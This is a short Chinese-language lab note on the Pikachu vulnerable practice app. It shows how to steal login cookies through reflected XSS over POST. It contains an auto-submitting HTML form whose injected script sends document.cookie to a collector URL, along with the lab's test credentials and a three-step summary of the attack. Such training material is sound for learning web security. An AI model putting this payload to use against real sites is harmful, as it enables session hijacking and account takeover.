## POST获取cookie
### 1、登陆pikachu的实验环境
```shell script
http://172.16.120.252:8085/vul/xss/xsspost/post_login.php
admin
123456
```
### 2、在vscode里面一段php代码
创建一个伪页面：http://172.16.120.252:8085/vul/xss/xsspost/xss_reflected_post.php
用户登陆之后，会把cookie，发送到自己的服务器：http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie=
```shell script
<html>
  <head>
    <script>
        window.onload = function () { 
            document.getElementById("magedu_xss_post_test").click();
        };
    </script>
    </head>
    <body> 
        <form method="post" action="http://172.16.120.252:8085/vul/xss/xsspost/xss_reflected_post.php" >  ## 和第一步的地址一样
            <input 
                id="xssr_in"  
                type="text" 
                name="message" 
                value="<script>
                document.location = 'http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie=' + document.cookie;  # 这行的ip地址，是自己的服务器的ip地址，接收cookie的
                </script>"
            />
            <input 
                id="magedu_xss_post_test" 
                type="submit" 
                name="submit" 
                value="submit" 
            /> 
        </form>
    </body>
</html>
```
### 3、原理：
````yaml
1、仿造页面
2、让用户，在仿造的页面，使用用户名和密码登陆
3、登陆成功之后，发送cookie到自己的服务器
````
